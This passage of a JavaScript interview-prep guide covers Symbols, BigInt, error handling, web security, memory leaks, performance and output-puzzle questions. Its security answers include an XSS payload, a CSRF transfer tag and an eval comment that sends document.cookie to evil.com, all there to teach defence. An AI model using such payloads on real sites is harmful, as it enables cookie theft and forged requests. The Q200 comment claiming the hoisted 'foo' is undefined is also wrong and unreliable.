const id1 = Symbol("id");
const id2 = Symbol("id");
id1 === id2; // false - always unique, even with the same description

const obj = {
  [id1]: "value",
  regularKey: "visible",
};
Object.keys(obj); // ['regularKey'] - Symbol keys are excluded!
JSON.stringify(obj); // '{"regularKey":"visible"}' - also excluded
```

**Trap:** Symbol-keyed properties are invisible to `Object.keys()`, `for...in`, and `JSON.stringify()` — deliberately, since Symbols were designed for "private-ish" metadata that shouldn't clutter normal enumeration.

### Q165. What is BigInt? *(new)*

**A:** A primitive type (ES2020) for integers larger than `Number.MAX_SAFE_INTEGER` (2^53 - 1), created by appending `n` to a numeric literal or calling `BigInt()`.

```javascript
const big = 9007199254740993n; // beyond Number's safe integer range
typeof big; // "bigint"

9007199254740993n + 1n; // 9007199254740994n - stays precise
Number.MAX_SAFE_INTEGER + 2; // 9007199254740992 - WRONG, loses precision as a regular Number

// BigInt and Number cannot be mixed directly:
// 1n + 1;                        // TypeError
1n + BigInt(1); // 2n - must convert explicitly
```

**Trap:** You can't mix `BigInt` and `Number` in arithmetic at all — even `1n + 1` throws a `TypeError`, forcing explicit conversion.

### Q166. What is dynamic import?

**A:** `import()` as a function call (not the static `import` statement) — loads a module asynchronously, returning a Promise, enabling code-splitting and conditional/lazy loading.

```javascript
button.addEventListener("click", async () => {
  const { default: Chart } = await import("./chart.js"); // loaded only when needed
  Chart.render();
});

// Conditional loading
if (userWantsFeatureX) {
  const module = await import("./feature-x.js");
}
```

**Trap:** Unlike static `import`, dynamic `import()` can be called anywhere — inside functions, conditionals, event handlers — which is exactly what makes lazy loading (Q193) and route-based code splitting (Q192) possible in bundlers like Webpack/Vite.

### Q167. What is top-level await? *(new)*

**A:** ES2022 feature allowing `await` directly at a module's top level, outside any `async function` — the module itself pauses loading until the awaited Promise settles.

```javascript
// data.js (an ES module)
const response = await fetch("/api/config"); // no wrapping async function needed
export const config = await response.json();
```

```javascript
// consumer.js (a separate file, importing from data.js above)
import { config } from "./data.js"; // waits for data.js to finish loading first
console.log(config);
```

**Trap:** Only works in actual ES modules (`type="module"`, `.mjs`, or ESM-configured bundlers) — using it in a regular script or CommonJS file is a `SyntaxError`.

### Q168. What is `structuredClone()`?

**A:** A built-in, native deep-clone function (no library needed) — handles far more types correctly than the old `JSON.parse(JSON.stringify())` trick, including `Date`, `Map`, `Set`, and circular references.

```javascript
const original = { date: new Date(), map: new Map([["a", 1]]), nested: { x: 1 } };
original.circular = original; // circular reference - fine!

const clone = structuredClone(original);
clone.date instanceof Date; // true - stays a real Date
clone.nested.x = 99;
console.log(original.nested.x); // 1 - fully independent
```

**Trap:** It still can't clone functions, DOM nodes, or class instance methods (throws `DataCloneError`) — for those, you still need a custom clone or a library.

### Q169. What are logical assignment operators? *(new)*

**A:** ES2021 shorthand combining a logical operator with assignment — only assigns if the logical condition is met, avoiding a separate `if` check.

```javascript
let a = null;
a ??= "default"; // a = a ?? 'default' -> assigns since a is nullish
console.log(a); // "default"

let count = 0;
count ||= 10; // assigns since 0 is falsy
console.log(count); // 10

let config = { theme: "dark" };
config.theme &&= config.theme.toUpperCase(); // assigns only if theme is truthy
console.log(config.theme); // "DARK"
```

**Trap:** `??=` is usually the one you actually want for "set a default only if missing" — `||=` will incorrectly overwrite legitimate falsy values like `0` or `""`, the same trap as `||` vs `??` in Q159.

### Q170. What is the pipeline operator proposal? *(new)*

**A:** A **proposed** (not yet standard, currently Stage 2 in TC39) operator `|>` that would let you chain function calls left-to-right instead of nesting them — improving readability for multi-step transformations.

```javascript
// Proposed syntax (NOT valid JS today - requires a Babel plugin to use):
// const result = value |> double |> addOne |> square;

// Today, the same thing requires nested calls or nested variables:
const result = square(addOne(double(value)));

// ...or a manual pipe helper, achievable in current JS:
const pipe = (...fns) => (x) => fns.reduce((acc, fn) => fn(acc), x);
const process = pipe(double, addOne, square);
process(value);
```

**Trap:** Don't present this as working JavaScript — it's explicitly a *proposal*, and interviewers asking about it are usually checking whether you're honest about what's shipped vs. what's still experimental.

---

<a id="phase-8"></a>

## Phase 8 – Error Handling, Security & Web Performance

**Goal:** Prepare senior-level frontend questions beyond syntax.

### Q171. What is error handling in JavaScript?

**A:** Catching and responding to runtime failures gracefully instead of letting them crash the program — primarily via `try/catch/finally` for synchronous code and `.catch()`/`try+await` for async code.

```javascript
try {
  JSON.parse("invalid json");
} catch (err) {
  console.error("Parse failed:", err.message);
} finally {
  console.log("Runs regardless of success or failure");
}
```

**Trap:** `try/catch` only catches synchronous errors thrown *within* the try block — an error thrown inside a `setTimeout` callback or unhandled Promise won't be caught by a surrounding `try/catch` (see Q175-177).

### Q172. What is the difference between `throw`, `try`, `catch`, and `finally`?

**A:**

```javascript
function divide(a, b) {
  if (b === 0) throw new Error("Cannot divide by zero"); // throw - raises an error
  return a / b;
}

try {
  // try - code that might fail
  console.log(divide(10, 0));
} catch (err) {
  // catch - handles the thrown error
  console.error(err.message);
} finally {
  // finally - ALWAYS runs, success or failure
  console.log("Cleanup");
}
```

**Trap:** `finally` runs even if `try` or `catch` contains a `return` statement — and a `return` inside `finally` will override any earlier `return`, a rarely-needed but real gotcha.

### Q173. What is a custom error?

**A:** A class extending the built-in `Error`, adding your own properties/name — lets calling code distinguish error types with `instanceof` instead of parsing message strings.

```javascript
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
  }
}

try {
  throw new ValidationError("Age must be positive", "age");
} catch (err) {
  if (err instanceof ValidationError) {
    console.log(`Field ${err.field}: ${err.message}`);
  }
}
```

**Trap:** Always call `super(message)` first inside the constructor — skipping it means `this.message` never gets set correctly, and `this` isn't valid until `super()` runs anyway (same rule as any class extending another).

### Q174. What is the difference between syntax error, reference error, and type error?

**A:**

```javascript
// SyntaxError - malformed code, caught at PARSE time, before anything runs
// const x = ;                 // SyntaxError

// ReferenceError - accessing a variable that doesn't exist / isn't in scope
console.log(undeclaredVar); // ReferenceError: undeclaredVar is not defined

// TypeError - operation on the wrong type (e.g., calling a non-function)
const num = 5;
num(); // TypeError: num is not a function
null.property; // TypeError: Cannot read properties of null
```

**Trap:** A `SyntaxError` can NEVER be caught by `try/catch` if it's in the same file being parsed — the whole script fails to parse before any code (including the `try` block) can execute. It's only catchable if the invalid syntax is being parsed dynamically (e.g., inside `eval()` or `JSON.parse()`).

### Q175. How do you handle global JavaScript errors? *(new)*

**A:** `window.addEventListener('error', ...)` catches uncaught synchronous errors anywhere in the page; `unhandledrejection` (Q177) separately catches unhandled Promise rejections.

```javascript
window.addEventListener("error", (event) => {
  console.error("Global error:", event.message, event.filename, event.lineno);
  // report to a monitoring service (Sentry, etc.)
  event.preventDefault(); // prevents default browser logging, optional
});

// In Node.js:
process.on("uncaughtException", (err) => {
  console.error("Uncaught:", err);
});
```

**Trap:** This is a last-resort safety net for logging/monitoring, not a substitute for proper `try/catch` — by the time a global handler fires, the app is often already in a broken state.

### Q176. What is `window.onerror`? *(new)*

**A:** The older, single-handler way to catch global errors (predates `addEventListener('error', ...)`) — takes a callback with positional arguments instead of an event object.

```javascript
window.onerror = function (message, source, lineno, colno, error) {
  console.error(`${message} at ${source}:${lineno}:${colno}`);
  return true; // returning true suppresses the default browser console error
};
```

**Trap:** `window.onerror` can only have **one** handler at a time (assigning a new one overwrites the old) — `window.addEventListener('error', ...)` (Q175) allows multiple independent handlers and is the modern preference.

### Q177. What is unhandled promise rejection? *(new)*

**A:** When a Promise rejects and no `.catch()` (or `try/catch` around an `await`) ever handles it — the browser fires an `unhandledrejection` event, and logs a warning to the console.

```javascript
Promise.reject(new Error("oops")); // never caught anywhere - triggers a warning

window.addEventListener("unhandledrejection", (event) => {
  console.error("Unhandled rejection:", event.reason);
  event.preventDefault(); // suppress the default browser warning, if desired
});
```

**Trap:** Unlike a thrown synchronous error, an unhandled rejection does NOT crash the program or stop execution — it fails silently unless you're specifically listening for it, making it an easy category of bug to miss entirely in testing.

### Q178. How do you handle API failures gracefully?

**A:** Check HTTP status (`fetch` doesn't reject on 404/500), provide user-facing fallback UI, and consider retry logic for transient failures.

```javascript
async function fetchWithFallback(url) {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    return await res.json();
  } catch (err) {
    console.error("API failed:", err.message);
    return { error: true, fallbackData: [] }; // graceful degradation
  }
}
```

**Trap:** Remember `fetch()` only rejects on network-level failures (DNS, offline, CORS) — a 404 or 500 response is still a "successful" fetch as far as the Promise is concerned; you must check `res.ok` yourself.

### Q179. What is XSS? *(new)*

**A:** Cross-Site Scripting — an attack where malicious JS gets injected into a page (via unsanitized user input) and executes in the context of a trusted site, able to steal cookies, session tokens, or manipulate the page.

```javascript
// Vulnerable: directly injecting untrusted input as HTML
element.innerHTML = userInput; // if userInput = "<img src=x onerror=alert(1)>", it EXECUTES

// If that page also relies on non-HttpOnly cookies for auth, XSS can steal them:
// document.cookie is readable by any script running on the page, including injected ones
```

**Trap:** XSS isn't just an "alert box" party trick in interviews — the real danger is that injected script runs with full access to the page's DOM and any readable cookies/localStorage, enabling session hijacking.

### Q180. How can JavaScript code prevent XSS? *(new)*

**A:** Never inject untrusted input as raw HTML; sanitize/escape it, prefer `textContent` over `innerHTML`, and use a Content Security Policy (Q183) as defense in depth.

```javascript
// Safe: textContent never interprets the string as HTML
element.textContent = userInput; // <img src=x onerror=...> renders as literal text, doesn't execute

// If you MUST render HTML from user input, sanitize it first:
// import DOMPurify from 'dompurify';
// element.innerHTML = DOMPurify.sanitize(userInput);

// React/Vue/etc. escape by default - this is why {variable} in JSX is safe,
// and dangerouslySetInnerHTML is named that way on purpose
```

**Trap:** Modern frameworks (React, Vue, Angular) escape content by default, which is exactly why bypassing that safety (`dangerouslySetInnerHTML`, `v-html`, raw `innerHTML`) should be treated as a deliberate, reviewed decision, not a casual convenience.

### Q181. What is CSRF? *(new)*

**A:** Cross-Site Request Forgery — an attack tricking a logged-in user's browser into making an unwanted request to a site they're authenticated on, exploiting the fact that cookies are sent automatically with every request (Q133).

```html
<!-- On a malicious site, while you're logged into bank.com in another tab: -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Your browser automatically attaches your bank.com session cookie to this request! -->
```

**Trap:** CSRF exploits *cookies being sent automatically*, so it primarily targets cookie-based auth (not `localStorage`-based tokens, which JS on the attacker's page can't read due to same-origin policy). Defenses: CSRF tokens, `SameSite` cookie attribute (Q135), and checking the `Origin`/`Referer` header server-side.

### Q182. What is CORS security?

**A:** CORS is fundamentally a security mechanism — the browser's way of enforcing that a server has explicitly opted in to letting other origins read its responses, preventing malicious sites from silently reading your authenticated data from another domain.

```javascript
// Server response headers control the policy:
// Access-Control-Allow-Origin: https://trusted-app.com  (specific origin)
// Access-Control-Allow-Credentials: true                 (allow cookies cross-origin)

// Wildcard * CANNOT be combined with credentials: true - the browser blocks it,
// since that combination would defeat the entire purpose of the restriction
```

**Trap:** CORS protects the *response* from being read by unauthorized JS — it does NOT prevent the request itself from happening or the server from processing it, which is why CSRF (Q181) is a separate, still-relevant threat even with CORS configured correctly.

### Q183. What is Content Security Policy? *(new)*

**A:** An HTTP response header that restricts what sources a page is allowed to load scripts, styles, images, etc. from — a strong defense-in-depth layer against XSS, even if an injection point exists.

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
```

```javascript
// With a strict CSP in place, even successfully injected inline scripts often
// won't execute at all, because inline <script> and eval() are blocked by default
// unless the policy explicitly allows 'unsafe-inline' / 'unsafe-eval'
```

**Trap:** A strict CSP by default blocks inline `<script>` tags, inline event handlers (`onclick="..."`), and `eval()` — a huge amount of legacy code silently breaks under a naively "strict" CSP, so it usually needs careful, incremental rollout.

### Q184. Why is `eval()` dangerous? *(new)*

**A:** `eval()` executes an arbitrary string as JavaScript with full access to the surrounding scope — if that string ever contains (or is influenced by) untrusted input, it's a direct code-execution vulnerability, not just a "bad practice."

```javascript
function calculate(expression) {
  return eval(expression); // if expression = "fetch('evil.com?cookie='+document.cookie)"...
}
// eval() also defeats most JS engine optimizations - the engine can't safely
// optimize code around an eval() call, since it might redefine anything

// Nearly always avoidable:
JSON.parse(jsonString); // instead of eval() for parsing JSON
new Function("a", "b", "return a + b"); // still risky, but more contained than eval()
```

**Trap:** Even indirect forms (`setTimeout("someCode()", 1000)` with a string, or `new Function(...)`) carry the same fundamental risk as `eval()` — always prefer passing an actual function reference, not a string to be parsed as code.

### Q185. What are memory leaks in JavaScript?

**A:** Memory that's no longer needed but never gets garbage collected, because something still holds a reference to it — the app's memory usage grows over time and never comes back down.

```javascript
let detachedNodes = [];
function leak() {
  const el = document.createElement("div");
  document.body.appendChild(el);
  document.body.removeChild(el); // removed from the page...
  detachedNodes.push(el); // ...but still referenced here, so NOT garbage collected
}
```

**Trap:** JS's garbage collector only frees memory that's truly *unreachable* — it can't tell the difference between "this reference is intentional" and "this reference was forgotten," which is exactly why leaks happen despite automatic GC.

### Q186. What causes memory leaks in frontend applications?

**A:**

```javascript
// 1. Forgotten event listeners on removed elements
element.addEventListener("click", handler);
element.remove(); // handler still referenced by the DOM node internally in some cases

// 2. Uncleared timers/intervals holding closures
setInterval(() => useSomeLargeObject(), 1000); // never cleared = large object never freed

// 3. Closures capturing large objects unnecessarily
function setup() {
  const bigData = new Array(1000000).fill("x");
  return () => console.log(bigData.length); // bigData stays alive as long as this fn does
}

// 4. Global variables that accumulate (e.g. an ever-growing cache/array)
window.cache = window.cache || [];
```

**Trap:** In React specifically, the single most common leak is a `useEffect` that adds a listener/subscription/timer without a cleanup function in its return — every mount leaks a bit more.

### Q187. How do you detect memory leaks in the browser? *(new)*

**A:** Chrome DevTools' **Memory** tab: take heap snapshots at different points, compare them, and look for objects/detached DOM nodes whose count keeps growing across repeated actions that should be memory-neutral.

```
1. Open DevTools -> Memory tab -> "Heap snapshot"
2. Perform an action that should NOT leak memory (open/close a modal, navigate away and back)
3. Take another snapshot, repeat the action several times, take a third
4. Compare snapshots - look for "Detached" DOM nodes and growing object counts
5. The "Allocation instrumentation on timeline" view shows exactly WHEN allocations happen
```

```javascript
// "Detached HTMLDivElement" in a heap snapshot means: removed from the page,
// but something in JS still holds a reference - exactly the leak pattern from Q185
```

**Trap:** A single heap snapshot tells you very little — leaks are only visible by comparing snapshots *across repeated actions*; a one-time snapshot just shows normal memory usage.

### Q188. What is garbage collection?

**A:** The JS engine's automatic process of freeing memory occupied by objects that are no longer reachable from any root reference (global scope, active call stack). Modern engines use a **mark-and-sweep** algorithm.

```javascript
let obj = { data: "large" }; // reachable, kept alive
obj = null; // no more references - eligible for GC, will be freed eventually

function create() {
  const local = { data: "temp" }; // reachable during the call
  return local.data;
} // after the function returns, `local` becomes unreachable - GC'd
create();
```

**Trap:** GC timing is non-deterministic — you cannot force immediate collection or predict exactly when it runs (there's no reliable `delete this object now`), which is why leak prevention (avoiding unnecessary references) matters more than trying to trigger cleanup manually.

### Q189. What are strong and weak references? *(new)*

**A:** A strong reference (the normal kind — a variable, object property, array element) keeps its target alive, preventing garbage collection. A weak reference (via `WeakMap`/`WeakSet`, or `WeakRef`) does NOT keep its target alive — the object can still be collected even while weakly referenced.

```javascript
let obj = { data: "value" };
const strongRefArray = [obj]; // strong reference - obj stays alive even if we do obj = null

const wm = new WeakMap();
wm.set(obj, "metadata"); // weak reference - does NOT prevent GC
obj = null; // now eligible for GC despite still being "in" the WeakMap
```

**Trap:** `WeakRef` (ES2021) lets you hold a weak reference to any single object directly (`new WeakRef(obj)`), but it's a specialized, rarely-needed API — `WeakMap`/`WeakSet` cover the vast majority of real use cases.

### Q190. How do WeakMap and WeakSet help garbage collection?

**A:** By not counting as a "real" reference — an object stored only as a `WeakMap`/`WeakSet` entry can still be garbage collected once nothing else references it, automatically cleaning up the entry too.

```javascript
const cache = new WeakMap();

function processElement(el) {
  if (cache.has(el)) return cache.get(el);
  const result = expensiveComputation(el);
  cache.set(el, result); // cached, but doesn't keep `el` alive artificially
  return result;
}
// If `el` (a DOM node) is later removed from the page and has no other references,
// it AND its cache entry are both garbage collected together - no manual cleanup needed
```

**Trap:** This is precisely why `WeakMap` is the right tool for "attach metadata to an object without affecting its lifecycle" — a regular `Map` used the same way would leak, since the Map itself would keep every key alive forever.

### Q191. What is tree shaking?

**A:** A build-time optimization (via bundlers like Webpack, Rollup, Vite) that removes unused exports from the final bundle — relies on ES module `import`/`export`'s static, analyzable structure.

```javascript
// utils.js
export function used() {} // included in the bundle
export function unused() {} // eliminated by tree shaking - never imported anywhere

// app.js
import { used } from "./utils.js"; // only `used` is imported
```

**Trap:** Tree shaking requires **ES modules** specifically — CommonJS (`require`/`module.exports`) is dynamic and not statically analyzable, so bundlers generally can't tree-shake it effectively.

### Q192. What is code splitting? *(new)*

**A:** Breaking a bundle into multiple smaller chunks that load on demand, instead of one giant file loaded upfront — reduces initial load time by only downloading what's needed for the current view.

```javascript
// Route-based splitting (React example)
const Dashboard = React.lazy(() => import("./Dashboard")); // separate chunk, loaded on demand

// Manual splitting via dynamic import
if (userNeedsChart) {
  const { renderChart } = await import("./chartLibrary.js");
  renderChart();
}
```

**Trap:** Code splitting shifts cost from "slow initial load" to "brief loading state when navigating to a new chunk" — it's a trade-off, not a free win, and needs proper loading states (`<Suspense>` in React) to avoid a jarring UX.

### Q193. What is lazy loading? *(new)*

**A:** Deferring the loading of a resource (component, image, module) until it's actually needed — a broader concept that code splitting (Q192) is one specific application of.

```javascript
// Lazy-loading a component (uses code splitting under the hood)
const Modal = React.lazy(() => import("./Modal"));

// Lazy-loading images natively (no JS needed)
// <img src="photo.jpg" loading="lazy" />

// Lazy-loading via IntersectionObserver (older browsers / more control)
const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src;
      observer.unobserve(entry.target);
    }
  });
});
```

**Trap:** Native `loading="lazy"` on `<img>` has broad browser support now and requires zero JS — reaching for a heavier `IntersectionObserver`-based library first (without checking if the native attribute suffices) is a common case of over-engineering.

### Q194. What is debouncing used for in performance optimization?

**A:** Limiting how often an expensive operation runs by waiting for a pause in rapid-fire events — search-as-you-type, resize-triggered re-layout, and auto-save are the classic cases.

```javascript
function debounce(fn, delay) {
  let timer;
  return (...args) => {
    clearTimeout(timer);
    timer = setTimeout(() => fn(...args), delay);
  };
}

const debouncedSearch = debounce((query) => {
  fetch(`/api/search?q=${query}`); // only fires after typing pauses
}, 300);
input.addEventListener("input", (e) => debouncedSearch(e.target.value));
```

**Trap:** Without debouncing, a search-as-you-type field fires one API call *per keystroke* — a very concrete, quantifiable performance/cost problem worth stating explicitly in an interview, not just "it's more efficient."

### Q195. What is throttling used for in performance optimization?

**A:** Guaranteeing an expensive operation runs at most once per fixed interval, even while the triggering event fires continuously — scroll position tracking, infinite-scroll loading, and mousemove-driven UI are classic cases.

```javascript
function throttle(fn, limit) {
  let inThrottle = false;
  return (...args) => {
    if (!inThrottle) {
      fn(...args);
      inThrottle = true;
      setTimeout(() => (inThrottle = false), limit);
    }
  };
}

const throttledScroll = throttle(() => {
  console.log("Scroll position:", window.scrollY); // runs at most once per 200ms
}, 200);
window.addEventListener("scroll", throttledScroll);
```

**Trap:** Debounce vs. throttle mix-ups are common — the deciding question is "do I want to react only once activity STOPS (debounce), or PERIODICALLY while it's still happening (throttle)?"

---

<a id="phase-9"></a>

## Phase 9 – Advanced JavaScript Output-based Questions

**Goal:** Practice tricky output questions commonly asked for experienced frontend engineers. For each: predict the output FIRST, then check the explanation.

### Q196. What is the output of code using function hoisting before declaration?

**A:**

```javascript
console.log(sum(2, 3)); // 5 - works! function declarations hoist completely

function sum(a, b) {
  return a + b;
}

console.log(multiply(2, 3)); // TypeError: multiply is not a function

var multiply = function (a, b) {
  return a * b;
};
```

**Trap:** Function *declarations* hoist their entire body; function *expressions* only hoist the `var` binding (as `undefined`) — calling it before the assignment line throws a `TypeError`, not a `ReferenceError`.

### Q197. What is the output of `let x = y = 0` inside a function?

**A:**

```javascript
function test() {
  let x = (y = 0); // only `x` is declared with let; `y` becomes an accidental GLOBAL
}
test();

console.log(typeof x); // "undefined" - x was function-scoped, inaccessible here
console.log(y); // 0 - leaked into the global scope!
```

**Trap:** `let x = y = 0` only applies `let` to `x` — the `y = 0` part is a plain assignment with no declaration keyword, so in non-strict mode it silently creates a global variable. In strict mode, this throws a `ReferenceError` instead (a good reason to always use strict mode / modules).

### Q198. What is the output order of synchronous logs and `setTimeout(..., 0)`?

**A:**

```javascript
console.log("1");
setTimeout(() => console.log("2"), 0);
console.log("3");
// Output: 1, 3, 2
```

**Trap:** `setTimeout(fn, 0)` never runs synchronously or "immediately" — it always waits for the call stack to clear and the microtask queue to drain, even with a 0ms delay.

### Q199. Why does `0.1 + 0.2 === 0.3` return false?

**A:**

```javascript
0.1 + 0.2; // 0.30000000000000004
0.1 + 0.2 === 0.3; // false

// Fix: epsilon-based comparison
Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON; // true

// Fix: do currency/precision-sensitive math in integers
const totalCents = 10 + 20; // 30 - exact, no floating point involved
```

**Trap:** JS stores numbers as IEEE-754 double-precision floats, which can't represent most decimal fractions exactly in binary — this happens in Python, Java, and C too, not just JS. The real-world fix for money math: work in integer cents, convert to decimal only for display.

### Q200. What is the output when a function expression is used inside an `if` condition?

**A:**

```javascript
if (typeof foo === "function") {
  console.log("foo exists");
} else {
  console.log("foo does not exist"); // this runs
}

function foo() {} // declared AFTER the check, but hoisted...

// However:
if (true) {
  function bar() {
    return "block-scoped in strict mode";
  }
}
console.log(typeof bar); // "function" in non-strict/sloppy mode (browser quirk),
// but behaves as block-scoped (undefined outside) under strict mode / modules
```

**Trap:** Function declarations *inside* blocks (`if`, `for`, etc.) have historically inconsistent hoisting behavior across engines — modern strict-mode/module code treats them as block-scoped, but legacy sloppy-mode code may still hoist them to the function/global scope. Always prefer function expressions/arrow functions inside conditionals to avoid the ambiguity entirely.

### Q201. What happens when `return` is placed before an object literal on the next line?

**A:**

```javascript
function getObject() {
  return
  {
    name: "John"
  };
}
console.log(getObject()); // undefined !!

function getObjectFixed() {
  return {
    name: "John",
  };
}
console.log(getObjectFixed()); // { name: 'John' }
```

**Trap:** This is Automatic Semicolon Insertion (ASI) — JS inserts an invisible semicolon immediately after `return` because it's followed by a newline, silently turning it into `return;` followed by unreachable code. Always open the brace on the SAME line as `return`.

### Q202. What is the output after deleting an array element using `delete arr[index]`?

**A:**

```javascript
const arr = [1, 2, 3];
delete arr[1];
console.log(arr); // [ 1, <1 empty item>, 3 ]
console.log(arr.length); // 3 - unchanged!
console.log(arr[1]); // undefined
console.log(1 in arr); // false - the slot doesn't exist, it's a hole
```

**Trap:** `delete` leaves a hole without shifting subsequent elements or updating `length` — use `splice()` if you actually want the array to shrink and re-index.

### Q203. What is the output of sparse arrays in modern browsers?

**A:**

```javascript
const sparse = [1, , 3]; // hole at index 1
console.log(sparse); // [ 1, <1 empty item>, 3 ]
console.log(sparse.length); // 3

sparse.forEach((x) => console.log(x)); // logs 1, then 3 - SKIPS the hole entirely
console.log(sparse.map((x) => x * 2)); // [ 2, <1 empty item>, 6 ] - also skips it

for (let i = 0; i < sparse.length; i++) {
  console.log(sparse[i]); // 1, undefined, 3 - a plain for-loop does NOT skip holes
}
```

**Trap:** Iteration method behavior is inconsistent by design — `forEach`/`map`/`filter` skip holes, but a plain indexed `for` loop or `for...of` does not (it yields `undefined` for the hole) — a genuine source of confusing bugs.

### Q204. What is the output of object method shorthand calls?

**A:**

```javascript
const counter = {
  count: 0,
  increment() {
    this.count++;
    return this.count;
  },
};
console.log(counter.increment()); // 1
console.log(counter.increment()); // 2

const { increment } = counter; // destructured - DETACHED from counter
console.log(increment()); // TypeError: Cannot read properties of undefined (reading 'count')
```

**Trap:** Destructuring a method off an object loses its `this` binding entirely — calling the detached reference fails because `this` is no longer `counter`. This is exactly why React historically required binding class methods in the constructor.

### Q205. What is the output of `1 < 2 < 3` and `3 > 2 > 1`?

**A:**

```javascript
1 < 2 < 3; // true  - evaluates left to right: (1 < 2) < 3 -> true < 3 -> 1 < 3 -> true
3 > 2 > 1; // false - (3 > 2) > 1 -> true > 1 -> 1 > 1 -> false
```

**Trap:** Comparison operators are NOT chained mathematically like in Python (`1 < 2 < 3` doesn't mean "is 2 between 1 and 3") — each comparison's boolean result gets coerced to `1`/`0` and compared again with the next operator, left to right.

### Q206. What happens when duplicate parameters are used in non-strict mode?

**A:**

```javascript
function sum(a, a, b) {
  // legal in non-strict mode
  console.log(a); // logs the LAST value passed for 'a', not the first
  return a + b;
}
console.log(sum(1, 2, 3)); // a=2 (overwrites the first a=1), b=3 -> 5
```

**Trap:** Non-strict mode silently allows duplicate parameter names, with the later one simply shadowing the earlier — a real footgun that strict mode (Q207) closes off entirely.

### Q207. What happens when duplicate parameters are used in arrow functions?

**A:**

```javascript
// const add = (a, a) => a + a;   // SyntaxError: Duplicate parameter name not allowed

// Also illegal in regular functions under "use strict":
function sum(a, a) {
  "use strict";
  return a + a; // SyntaxError, same rule applies
}
```

**Trap:** Arrow functions are ALWAYS treated as if in strict mode for this specific rule — duplicate parameter names are a `SyntaxError` unconditionally, regardless of surrounding strict-mode declarations, unlike regular functions where it depends on context.

### Q208. What happens when arrow functions access `arguments`?

**A:**

```javascript
const arrow = () => {
  console.log(arguments); // ReferenceError: arguments is not defined (if no enclosing function)
};
// arrow();

function outer() {
  const inner = () => {
    console.log(arguments); // refers to OUTER's arguments - arrows have none of their own
  };
  inner();
}
outer(1, 2, 3); // logs [Arguments] { '0': 1, '1': 2, '2': 3 } - outer's args, not inner's
```

**Trap:** At the top level (no enclosing regular function), referencing `arguments` inside an arrow function throws a `ReferenceError` — there's nothing lexically enclosing to inherit it from.

### Q209. What is the output of `Math.max()`?

**A:**

```javascript
Math.max(); // -Infinity (no arguments = weakest possible "maximum")
Math.min(); // Infinity  (same logic, opposite direction)

Math.max(1, 2, 3); // 3
Math.max([1, 2, 3]); // NaN - doesn't accept an array directly!
Math.max(...[1, 2, 3]); // 3 - must spread the array into individual arguments
```

**Trap:** `Math.max()`/`Math.min()` take individual arguments, not an array — passing an array directly gives `NaN` since the array coerces to a string, not a number. Spread it, or use `Math.max.apply(null, arr)`.

### Q210. What is the output of `typeof null`?

**A:**

```javascript
typeof null; // "object" - a long-standing bug in the language spec

null instanceof Object; // false - despite typeof saying "object"!
```

**Trap:** This is a famous, never-fixed bug dating back to JS's original 1995 implementation (a leftover from how values were represented internally) — fixing it now would break too much existing code on the web, so it stays permanently. Always mention this is a *known bug*, not a logical design choice, when explaining it.

### Q211. What is the output of `typeof NaN`?

**A:**

```javascript
typeof NaN; // "number" - NaN's TYPE is number, even though its name suggests otherwise

typeof typeof NaN; // "string" - typeof always returns a string (see Q214)
```

**Trap:** `NaN` stands for "Not a Number" but its actual JS type IS `"number"` — it represents an invalid numeric computation, not a non-numeric value, a naming choice that confuses almost everyone at first.

### Q212. What is the output of `[] + []`, `[] + {}`, and `{} + []`?

**A:**

```javascript
[] + []; // ""          - both arrays coerce to "" (empty string), concatenated
[] + {}; // "[object Object]" - [] -> "", {} -> "[object Object]", concatenated
({}) + []; // "[object Object]" - same result, but needs parens (see the trap below)

{} +[]; // 0 - WITHOUT parens, the leading {} is parsed as an empty BLOCK statement,
// not an object literal, leaving just the separate statement +[] -> coerces [] to 0
```

**Trap:** The last one is the real trick: `{} + []` typed as a bare statement parses `{}` as an empty block (not an object literal), leaving just `+[]`, which coerces the empty array to the number `0`. This is the exact same "`{}` at statement-start" parsing quirk from Q95's cousin case — wrap in parentheses to force object-literal interpretation.

### Q213. What is the output of `true + false`?

**A:**

```javascript
true + false; // 1 - booleans coerce to numbers: true -> 1, false -> 0
true + true; // 2
false + false; // 0
"5" + true; // "5true" - + prefers string concat when a string is involved
5 + true; // 6 - no string involved, so true coerces to 1
```

**Trap:** Whether `+` concatenates or adds numerically depends entirely on whether *either* operand is a string — booleans and numbers always coerce toward numeric addition unless a string forces string concatenation instead.

### Q214. What is the output of `typeof typeof 1`?

**A:**

```javascript
typeof 1; // "number"
typeof typeof 1; // "string" - typeof "number" -> "string" (typeof ALWAYS returns a string)
```

**Trap:** `typeof` always returns one of exactly 8 possible strings (`"number"`, `"string"`, `"boolean"`, `"undefined"`, `"object"`, `"function"`, `"symbol"`, `"bigint"`) — so `typeof typeof anything` is always `"string"`, no matter what you start with.

### Q215. What is the output of comparing objects and arrays by reference?

**A:**

```javascript
({}) === {}; // false - two different objects, even though they look identical (needs parens - see Q212)
[] === []; // false - same reason
[1, 2] === [1, 2]; // false

const obj = {};
obj === obj; // true - same reference

[1, 2].toString() === [1, 2].toString(); // true - comparing the resulting STRINGS, not the arrays
JSON.stringify({ a: 1 }) === JSON.stringify({ a: 1 }); // true - comparing strings again
```

**Trap:** `===` on objects/arrays only ever checks reference identity, never structural equality — comparing "shape" requires either a deep-equal utility function, `JSON.stringify()` (imperfect - key order matters), or a library like Lodash's `isEqual`.

---

<a id="phase-10"></a>

## Phase 10 – Senior Frontend JavaScript System-level Questions

**Goal:** Prepare for 6-year frontend engineer discussions, architecture, debugging, and production use cases.

### Q216. How does JavaScript execution context work?

**A:** Every function call creates a new execution context, pushed onto the call stack, containing that scope's variables, `this` binding, and a reference to its outer (lexical) environment. Runs in two phases (see Q217).

```javascript
let a = "global";
function outer() {
  let b = "outer";
  function inner() {
    let c = "inner";
    console.log(a, b, c); // "global outer inner" - accesses all 3 via the scope chain
  }
  inner();
}
outer();
// Call stack while inner() runs: inner -> outer -> global (each is its own execution context)
```

**Trap:** "Execution context" and "scope" are related but distinct — the context is the runtime container (with `this`, variables, and the outer reference); the scope chain is what that container uses to resolve variable lookups.

### Q217. What is the difference between creation phase and execution phase? *(new)*
